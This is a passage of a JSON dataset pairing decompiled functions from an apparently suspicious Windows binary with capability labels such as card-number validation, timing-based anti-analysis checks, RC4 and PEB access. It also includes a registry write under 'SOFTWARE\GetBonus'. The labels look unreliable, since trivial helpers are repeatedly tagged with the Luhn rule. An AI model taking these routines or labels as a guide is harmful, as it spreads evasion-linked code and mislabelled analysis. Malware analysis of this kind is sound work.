&var_34h;\n    uVar4 = 0;\n    uVar2 = fcn.00404f00(0);\n    (*_sym.imp.MPR.dll_WNetGetConnectionW)(&var_18h, uVar2, uVar4, puVar3, uVar5, uVar6, uVar1);\n    var_36h = 0;\n    puVar3 = fcn.0040b7f0(&var_48h, &var_30h);\n    var_3ch = *puVar3;\n    arg_14h = &var_36h;\n    puVar3 = fcn.0040b7f0(&var_4ch, &var_30h);\n    uVar2 = *puVar3;\n    puVar3 = fcn.0040b7d0(&var_50h, &var_30h);\n    puVar3 = fcn.0040b810(&var_54h, *puVar3, uVar2, arg_14h);\n    var_40h = *puVar3;\n    puVar3 = &var_58h;\n    fcn.0040b440(puVar3, var_40h, var_3ch);\n    uVar2 = fcn.00401440(&var_30h);\n    fcn.00405010(uVar2);\n    fcn.00404f30();\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(puVar3);\n    return;\n}\n",
        "token_count": 691
    },
    "0040b360": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_5ch\n\nvoid __cdecl fcn.0040b360(uint arg_8h)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint in_ECX;\n    uint var_5ch;\n    uint hHandle;\n    uint hObject;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    cVar1 = fcn.00404d10();\n    if (cVar1 == '\\0') {\n        fcn.00452000(&var_48h, 0, 0x44);\n        hHandle = 0;\n        hObject = 0;\n        var_50h = 0;\n        var_4ch = 0;\n        uVar2 = fcn.00404db0(0, 0, 1, 0x8000000, 0, 0, &var_48h, &hHandle);\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, uVar2);\n        if (iVar3 != 0) {\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(hHandle);\n        }\n    }\n    fcn.0043a2e7(in_ECX);\n    return;\n}\n",
        "token_count": 351
    },
    "0040b4c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b4c0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    uVar1 = fcn.0040b590();\n    uVar1 = fcn.00401440(uVar1);\n    arg_8h_00 = fcn.00404c30();\n    fcn.00407510(arg_8h_00, uVar1);\n    return;\n}\n",
        "token_count": 109
    },
    "0040b4f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b4f0(uint arg_8h)\n\n{\n    uint uVar1;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    uVar1 = fcn.0040b590();\n    uVar1 = fcn.00401440(uVar1);\n    arg_8h_00 = fcn.00404c30();\n    fcn.004064f0(arg_8h_00, uVar1);\n    return;\n}\n",
        "token_count": 110
    },
    "0040b6c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0040b6c0(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t arg_8h_00;\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    ushort var_4h;\n    uint var_1h;\n    \n    iVar1 = fcn.00404960();\n    if (arg_8h < *(iVar1 + 0x14) || arg_8h == *(iVar1 + 0x14)) {\n        arg_8h_00 = fcn.00406170();\n        *(iVar1 + 0x10) = arg_8h;\n        fcn.00407730(arg_8h_00, arg_8h, arg_ch & 0xffff);\n        var_4h = 0;\n        fcn.00407220(arg_8h_00 + arg_8h * 2, &var_4h);\n    }\n    else {\n        var_1h._0_1_ = 0;\n        in_ECX = fcn.0040b8c0(arg_8h, 0, arg_ch & 0xffff);\n    }\n    return in_ECX;\n}\n",
        "token_count": 307
    },
    "0040b810": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040b810(uint *arg_8h, uint arg_ch, uint arg_10h, int16_t *arg_14h)\n\n{\n    uint arg_8h_00;\n    int16_t *arg_ch_00;\n    int16_t *piVar1;\n    uint *puVar2;\n    uint var_ch;\n    int16_t *var_8h;\n    int16_t *var_4h;\n    \n    arg_8h_00 = fcn.0040ba40(&arg_ch);\n    arg_ch_00 = fcn.0040ba40(&arg_10h);\n    var_8h = fcn.0040ba60(arg_8h_00, arg_ch_00, arg_14h);\n    var_4h = var_8h;\n    if (var_8h != arg_ch_00) {\n        while (var_4h = var_4h + 1,  var_4h != arg_ch_00) {\n            if (*var_4h != *arg_14h) {\n                piVar1 = fcn.00401440(var_4h);\n                *var_8h = *piVar1;\n                var_8h = var_8h + 1;\n            }\n        }\n    }\n    puVar2 = fcn.00409ff0(&arg_ch, var_8h);\n    *arg_8h = *puVar2;\n    return arg_8h;\n}\n",
        "token_count": 325
    },
    "0040b8c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b8c0(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *arg_8h_00;\n    uint32_t uVar2;\n    uint noname_0;\n    uint uVar3;\n    uint *arg_10h_00;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    uVar1 = fcn.00407890();\n    if (uVar1 < arg_8h) {\n        fcn.00409220();\n    }\n    arg_8h_00 = fcn.00404960();\n    uVar1 = arg_8h_00[5];\n    uVar2 = fcn.00409230(arg_8h);\n    noname_0 = fcn.00404960();\n    var_8h = fcn.00407910(-(0xfffffffe < uVar2) | uVar2 + 1);\n    fcn.00401420();\n    arg_8h_00[4] = arg_8h;\n    arg_8h_00[5] = uVar2;\n    arg_10h = arg_10h & 0xffff;\n    uVar3 = fcn.00401440(var_8h);\n    fcn.0040b750(uVar3, arg_8h, arg_10h);\n    if (uVar1 < 8) {\n        arg_10h_00 = &var_8h;\n        uVar3 = fcn.00401440(arg_8h_00);\n        fcn.00408ce0(noname_0, uVar3, arg_10h_00);\n    }\n    else {\n        uVar3 = *arg_8h_00;\n        fcn.00407710(uVar3, uVar1 + 1);\n        *arg_8h_00 = var_8h;\n    }\n    fcn.0043a2e7(uVar3);\n    return;\n}\n",
        "token_count": 503
    },
    "0040b9c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040b9c0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t *in_FS_OFFSET;\n    int32_t arg_ch;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00404960(uVar1);\n    iVar3 = fcn.00401440(uVar2);\n    arg_ch = iVar3;\n    uVar2 = fcn.00406170();\n    iVar4 = fcn.00401440(uVar2);\n    fcn.004073d0(iVar4 + *(iVar3 + 0x10) * 2, arg_ch);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 262
    },
    "0040ba40": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ba40(uint *arg_8h)\n\n{\n    fcn.00401440(*arg_8h);\n    return;\n}\n",
        "token_count": 36
    },
    "0040ba60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0040ba60(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint var_1h;\n    \n    fcn.0040ba90(arg_8h, arg_ch, arg_10h);\n    return;\n}\n",
        "token_count": 77
    },
    "0040bac0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2"
        ],
        "decompiled_code": "\nuchar * __fastcall fcn.0040bac0(uchar *param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = 0;\n    *(param_1 + 4) = 0;\n    *(param_1 + 8) = 0;\n    *(param_1 + 0xc) = 0;\n    *(param_1 + 0x10) = 0;\n    fcn.004057c0();\n    return param_1;\n}\n",
        "token_count": 108
    },
    "0040bb10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040bb10(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040bbc0(param_1);\n    fcn.004055f0();\n    return;\n}\n",
        "token_count": 66
    },
    "0040bb30": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nchar __cdecl fcn.0040bb30(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    char *in_ECX;\n    uint var_4h;\n    \n    if (*in_ECX == '\\0') {\n        cVar1 = fcn.00404d10();\n        if (((cVar1 == '\\0') && (cVar1 = fcn.0040bcd0(),  cVar1 != '\\0')) && (cVar1 = fcn.0040bd50(),  cVar1 != '\\0')) {\n            arg_8h_00 = fcn.00401440(arg_8h);\n            cVar1 = fcn.0040bdc0(arg_8h_00);\n            if ((cVar1 != '\\0') && (cVar1 = fcn.0040beb0(),  cVar1 != '\\0')) {\n                *in_ECX = '\\x01';\n                return *in_ECX;\n            }\n        }\n        fcn.0040bbc0();\n        cVar1 = *in_ECX;\n    }\n    else {\n        cVar1 = '\\x01';\n    }\n    return cVar1;\n}\n",
        "token_count": 262
    },
    "0040bc60": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040bc60(uint arg_8h)\n\n{\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470140;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00405810(in_ECX + 0x14);\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 134
    },
    "0040c110": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c110(uint arg_8h)\n\n{\n    fcn.004565f8(arg_8h);\n    return;\n}\n",
        "token_count": 35
    },
    "0040c350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c350(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t *in_FS_OFFSET;\n    uint var_58h;\n    uint var_40h;\n    uint var_28h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470670;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    fcn.00405750(0x485b94);\n    fcn.00405750(0x485b9c);\n    uVar1 = fcn.0041b1a0(&var_58h, 0x80000001, &var_28h, &var_40h);\n    uVar1 = fcn.00401440(uVar1);\n    fcn.004056d0(uVar1);\n    fcn.004055f0();\n    fcn.004055f0();\n    fcn.004055f0();\n    *in_FS_OFFSET = var_ch;\n    return arg_8h;\n}\n",
        "token_count": 259
    },
    "0040c3f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040c3f0(uint arg_8h)\n\n{\n    uint32_t uVar1;\n    uint arg_14h;\n    int32_t *in_FS_OFFSET;\n    char *pcVar2;\n    char *pcVar3;\n    uint var_44h;\n    uint var_2ch;\n    uint var_14h;\n    uint8_t var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470690;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    pcVar3 = \"Free\";\n    fcn.00405750(\"Free\");\n    pcVar2 = \"SOFTWARE\\\\GetBonus\";\n    fcn.00405750(\"SOFTWARE\\\\GetBonus\");\n    arg_14h = fcn.00401440(arg_8h);\n    var_dh = fcn.0041b2d0(0x80000001, &var_2ch, &var_44h, arg_14h);\n    fcn.004055f0(pcVar2, pcVar3, uVar1);\n    uVar1 = fcn.004055f0();\n    *in_FS_OFFSET = var_ch;\n    return uVar1 & 0xffffff00 | var_dh;\n}\n",
        "token_count": 321
    },
    "0040c4e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint32_t fcn.0040c4e0(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470210;\n    var_ch = *in_FS_OFFSET;\n    uVar2 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar2 = fcn.00456541(uVar2);\n    uVar3 = fcn.00404d90();\n    puVar4 = fcn.00405270(uVar2 % uVar3);\n    uVar1 = *puVar4;\n    *in_FS_OFFSET = var_ch;\n    return puVar4 & 0xffffff00 | uVar1;\n}\n",
        "token_count": 224
    },
    "0040c650": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040c650(int32_t arg_8h, uint arg_ch, int32_t arg_10h, uint arg_14h)\n\n{\n    uint var_8h;\n    uint var_1h;\n    \n    fcn.00401380(arg_8h, arg_ch, arg_10h);\n    fcn.00401410(arg_8h + arg_10h, &arg_14h);\n    var_1h._0_1_ = 0;\n    fcn.00401410(arg_8h + 1 + arg_10h, &var_1h);\n    return;\n}\n",
        "token_count": 166
    },
    "0040c6b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040c6b0(uint32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint *arg_ch_00;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint arg_8h_00;\n    uint uVar5;\n    uint *arg_10h_00;\n    int32_t arg_10h_01;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x49106c ^ &stack0xfffffffc;\n    arg_ch_00 = fcn.00404960();\n    arg_10h_01 = arg_ch_00[4];\n    iVar2 = fcn.004069e0();\n    if (iVar2 - arg_10h_01 < arg_8h) {\n        fcn.00409220();\n    }\n    uVar1 = arg_ch_00[5];\n    uVar3 = fcn.00409410(arg_10h_01 + arg_8h);\n    uVar4 = fcn.00404960();\n    var_8h = fcn.004071d0(-(0xfffffffe < uVar3) | uVar3 + 1);\n    fcn.00401420();\n    arg_ch_00[4] = arg_10h_01 + arg_8h;\n    arg_ch_00[5] = uVar3;\n    arg_8h_00 = fcn.00401440(var_8h);\n    if (uVar1 < 0x10) {\n        fcn.0040c650(arg_8h_00, arg_ch_00, arg_10h_01, arg_10h & 0xff);\n        arg_10h_00 = &var_8h;\n        uVar5 = fcn.00401440(arg_ch_00);\n        fcn.00408ce0(uVar4, uVar5, arg_10h_00);\n    }\n    else {\n        uVar4 = *arg_ch_00;\n        arg_10h = arg_10h & 0xff;\n        uVar5 = fcn.00401440(uVar4);\n        fcn.0040c650(arg_8h_00, uVar5, arg_10h_01, arg_10h);\n        fcn.00407200(uVar4, uVar1 + 1);\n        *arg_ch_00 = var_8h;\n    }\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 643
    },
    "0040cdc0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cdc0(uint arg_8h, uint arg_ch)\n\n{\n    uint *puVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t *in_FS_OFFSET;\n    uint arg_10h;\n    uint arg_18h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uchar var_dh;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470700;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    var_dh = 0;\n    fcn.0040ea70(&var_14h);\n    puVar1 = fcn.0040eaf0(&var_18h);\n    arg_18h = *puVar1;\n    puVar1 = &var_1ch;\n    puVar2 = fcn.0040ea70(puVar1);\n    arg_10h = *puVar2;\n    puVar2 = &var_20h;\n    puVar3 = fcn.0040eaf0(puVar2);\n    fcn.0040f950(*puVar3, puVar2, arg_10h, puVar1, arg_18h);\n    *in_FS_OFFSET = var_ch;\n    return;\n}\n",
        "token_count": 323
    },
    "0040ce50": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "encrypt data using RC4 KSA/41e5dbd1fcbf406ebac8c999dfc1b5ff"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040ce50(uint32_t arg_8h, uint32_t arg_ch)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar1 = fcn.004567ba(arg_8h & 0xffff);\n    uVar2 = fcn.004567ba(arg_ch & 0xffff);\n    var_4h = uVar1 == uVar2;\n    return uVar2 & 0xffffff00 | var_4h;\n}\n",
        "token_count": 130
    },
    "0040cee0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040cee0(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.00401440(arg_8h);\n    fcn.00405010(arg_8h_00);\n    return in_ECX;\n}\n",
        "token_count": 81
    },
    "0040cf90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_34h\n\nvoid __cdecl fcn.0040cf90(uint arg_8h)\n\n{\n    uint32_t arg_8h_00;\n    uint uVar1;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint var_34h;\n    uint var_30h;\n    uchar var_29h;\n    uint var_28h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x470728;\n    var_ch = *in_FS_OFFSET;\n    arg_8h_00 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    var_10h = arg_8h_00;\n    fcn.00405100(arg_8h_00, 0);\n    var_4h = 0;\n    uVar1 = fcn.00404d90(var_29h);\n    arg_ch = fcn.00404db0();\n    uVar1 = fcn.0040e970(&var_28h, arg_ch, uVar1);\n    fcn.00405010(uVar1);\n    var_4h = 0xffffffff;\n    fcn.00404f30(uVar1, arg_8h_00, 1);\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(arg_8h_00);\n    return;\n}\n",
        "token_count": 350
    },
    "0040d0d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040d0d0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040cea0();\n    fcn.0040b410(0, 0xffff);\n    fcn.0040b410(0, 0xffff);\n    return param_1;\n}\n",
        "token_count": 73
    },
    "0040d1a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040d1a0(uint *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *puVar3;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    puVar3 = fcn.0040c990();\n    uVar1 = puVar3[1];\n    *arg_ch = *puVar3;\n    arg_ch[1] = uVar1;\n    cVar2 = fcn.0040dbf0(*(var_4h + 0x18));\n    if (cVar2 == '\\0') {\n        cVar2 = fcn.0040dbf0(*(var_4h + 0x20));\n        if ((cVar2 == '\\0') || (cVar2 = fcn.0040db10(*(var_4h + 0x20)),  cVar2 != '\\0')) {\n            puVar3 = fcn.0040db90(&var_14h, var_4h, arg_ch);\n            uVar1 = puVar3[1];\n            *(var_4h + 0x18) = *puVar3;\n            *(var_4h + 0x1c) = uVar1;\n        }\n        else {\n            *(var_4h + 0x18) = *(var_4h + 0x20);\n            *(var_4h + 0x1c) = *(var_4h + 0x24);\n        }\n    }\n    uVar1 = *(var_4h + 0x1c);\n    *arg_8h = *(var_4h + 0x18);\n    arg_8h[1] = uVar1;\n    return arg_8h;\n}\n",
        "token_count": 402
    },
    "0040d2b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0040d2b0(uint *arg_8h, uint *arg_ch)\n\n{\n    uint uVar1;\n    char cVar2;\n    uint *puVar3;\n    uint var_14h;\n    uint var_ch;\n    int32_t var_4h;\n    \n    puVar3 = fcn.0040c990();\n    uVar1 = puVar3[1];\n    *arg_ch = *puVar3;\n    arg_ch[1] = uVar1;\n    cVar2 = fcn.0040dbf0(*(var_4h + 0x20));\n    if (cVar2 == '\\0') {\n        puVar3 = fcn.0040dc20(&var_14h, var_4h, arg_ch);\n        uVar1 = puVar3[1];\n        *(var_4h + 0x20) = *puVar3;\n        *(var_4h + 0x24) = uVar1;\n    }\n    uVar1 = *(var_4h + 0x24);\n    *arg_8h = *(var_4h + 0x20);\n    arg_8h[1] = uVar1;\n    return arg_8h;\n}\n",
        "token_count": 277
    },
    "0040d350": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "get number of processors"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0040d350(int32_t param_1)\n\n{\n    uint32_t uVar1;\n    uint arg_ch;\n    int32_t *in_FS_OFFSET;\n    uint var_70h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint uStack8;\n    \n    uStack8 = 0xffffffff;\n    uStack12 = 0x470780;\n    var_ch = *in_FS_OFFSET;\n    uVar1 = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    arg_ch = fcn.0040fcd0(uVar1);\n    fcn.0040e670(1, arg_ch);\n    fcn.0040d8a0();\n    fcn.0040d0d0();\n    *(param_1 + 0x30) = 0;\n    *(param_1 + 0x34) = 0;\n    *in_FS_OFFSET = var_ch;\n    return param_1;\n}\n",
        "token_count": 232
    },
    "0040d3d0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl fcn.0040d3d0(uint arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    int32_t *in_FS_OFFSET;\n    uint var_c8h;\n    uint var_68h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x4707c6;\n    var_ch = *in_FS_OFFSET;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = fcn.0040e730(arg_8h);\n    var_4h = 0;\n    uVar1 = fcn.0040fd30(uVar1, arg_8h);\n    var_4h._0_1_ = 1;\n    fcn.0040e670(1, uVar1);\n    var_4h._0_1_ = 3;\n    fcn.0040d8a0();\n    var_4h._0_1_ = 4;\n    fcn.0040d8c0();\n    fcn.0040d0d0();\n    var_4h = CONCAT31(var_4h._1_3_, 5);\n    *(in_ECX + 0x30) = 0;\n    *(in_ECX + 0x34) = arg_ch;\n    fcn.0040d760();\n    *in_FS_OFFSET = var_ch;\n    return in_ECX;\n}\n",
        "token_count": 383
    },
    "0040d730": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d730(uint arg_8h)\n\n{\n    uint arg_ch;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_ch = fcn.0040e4a0();\n    arg_8h_00 = fcn.0040e4a0();\n    fcn.0040fdb0(arg_8h_00, arg_ch);\n    return;\n}\n",
        "token_count": 94
    },
    "0040d760": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0040d760(void)\n\n{\n    uint uVar1;\n    uint arg_8h;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    int32_t *in_FS_OFFSET;\n    uint in_stack_ffffff1c;\n    uint var_c0h;\n    uint var_78h;\n    uint var_60h;\n    uint var_58h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_39h;\n    uint32_t var_10h;\n    int32_t var_ch;\n    uint uStack12;\n    uint var_4h;\n    \n    var_4h = 0xffffffff;\n    uStack12 = 0x47087b;\n    var_ch = *in_FS_OFFSET;\n    var_10h = *0x49106c ^ &stack0xfffffffc;\n    *in_FS_OFFSET = &var_ch;\n    uVar1 = fcn.0040e880(var_10h);\n    var_4h = 0;\n    var_48h = uVar1;\n    var_44h = uVar1;\n    arg_8h = fcn.0040e4c0();\n    var_39h._0_1_ = fcn.0040fdd0(arg_8h, uVar1);\n    var_4h = 0xffffffff;\n    fcn.0040d8c0();\n    if (var_39h != '\\0') {\n        fcn.0040e4c0();\n        uVar1 = fcn.0040e710();\n        fcn.0040d990(uVar1);\n        var_4h = 1;\n        uVar1 = fcn.00402930();\n        iVar2 = fcn.0040e4c0();\n        var_50h = fcn.0040d040(&var_78h, iVar2 + 0x48, uVar1);\n        var_4h._0_1_ = 2;\n        var_4ch = var_50h;\n        puVar3 = fcn.0040d260(&var_58h);\n        uVar1 = *puVar3;\n        puVar3 = &var_60h;\n        puVar4 = fcn.0040d150(puVar3);\n        in_stack_ffffff1c = *puVar4;\n        fcn.0040d110(var_50h, in_stack_ffffff1c, puVar4[1], puVar3, uVar1);\n        var_4h = CONCAT31(var_4h._1_3_, 1);\n        fcn.0040cf10();\n        var_4h = 0xffffffff;\n        fcn.0040d330();\n    }\n    *in_FS_OFFSET = var_ch;\n    fcn.0043a2e7(in_stack_ffffff1c);\n    return;\n}\n",
        "token_count": 667
    },
    "0040d8a0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __fastcall fcn.0040d8a0(uint param_1)\n\n{\n    uint var_4h;\n    \n    fcn.0040cf10(param_1);\n    fcn.0040d8c0();\n    return;\n}\n",
        "token_count": 70
    },
    "0040d8c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
